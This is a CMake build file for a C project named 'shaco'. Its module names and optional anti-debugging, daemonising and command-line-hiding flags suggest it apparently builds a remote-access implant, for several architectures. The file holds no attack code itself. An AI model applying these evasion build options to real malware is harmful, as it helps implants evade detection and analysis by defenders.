cmake_minimum_required(VERSION 3.0)
project(shaco C)

# set(CMAKE_C_COMPILER clang)

if( NOT DEFINED COMPILE_ARCH)
    set(COMPILE_ARCH "x64")
endif()

if(NOT DEFINED CMAKE_BUILD_TYPE)
    set(CMAKE_BUILD_TYPE Debug)
endif()

if( NOT DEFINED COMPILE_LIB )
    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -static")
endif()

if(DEFINED AntiDebug)
    add_compile_definitions(ANTIDEBUG)
endif()

if(DEFINED Daemon)
    add_compile_definitions(DAEMONIZE)
endif()

if(DEFINED HIDE_CMDLINE)
    add_compile_definitions(HIDE_CMDLINE)
endif()

if(COMPILE_ARCH STREQUAL "x86")
    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -m32")
elseif(COMPILE_ARCH STREQUAL "x64")
    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -m64")
elseif(COMPILE_ARCH STREQUAL "arm")
    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -target armv7a-linux-gnueabihf -march=armv7-a")
    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -target armv7a-linux-gnueabihf")
endif()

if(CMAKE_BUILD_TYPE MATCHES Debug)
    message("Compiling in debug mode")
    set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -Og")
    add_compile_definitions(DEBUG)
else()
    message("Compiling in release mode")
    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -fPIC -Oz -flto -Wno-write-strings -fomit-frame-pointer -fno-exceptions -fmerge-all-constants -fdata-sections -ffunction-sections")
    add_compile_definitions(Release)
endif()

set(
    SHACO_SOURCES

    shaco.c

    Common/shaco_stdlib.c
    Common/shaco_syscall.c
    Common/Default.c
    Common/Network.c

    Config/OSConfig.c
    Config/Settings.c

    Helpers/Protect.c
    Helpers/Http.c

    Protocol/Packer.c

    Core/Core.c
    Core/Communication.c
    Core/Commands.c
)


if( NOT DEFINED COMPILE_LIB )
    add_executable( ${PROJECT_NAME} ${SHACO_SOURCES})
    if(COMPILE_ARCH STREQUAL "x86")
        set_target_properties(${PROJECT_NAME} PROPERTIES COMPILE_FLAGS "-m32")
    elseif(COMPILE_ARCH STREQUAL "x64")
        set_target_properties(${PROJECT_NAME} PROPERTIES COMPILE_FLAGS "-m64")
    elseif(COMPILE_ARCH STREQUAL "arm")
        set_target_properties(${PROJECT_NAME} PROPERTIES COMPILE_FLAGS "-march=armv7-a")
    endif()
else()
    add_library(${PROJECT_NAME} SHARED ${SHACO_SOURCES})
    set_target_properties(${PROJECT_NAME} PROPERTIES POSITION_INDEPENDENT_CODE ON)
    if(COMPILE_ARCH STREQUAL "x86")
        set_target_properties(${PROJECT_NAME} PROPERTIES COMPILE_FLAGS "-m32")
    elseif(COMPILE_ARCH STREQUAL "x64")
        set_target_properties(${PROJECT_NAME} PROPERTIES COMPILE_FLAGS "-m64")
    elseif(COMPILE_ARCH STREQUAL "arm")
        set_target_properties(${PROJECT_NAME} PROPERTIES COMPILE_FLAGS "-march=armv7-a")
    endif()
endif()
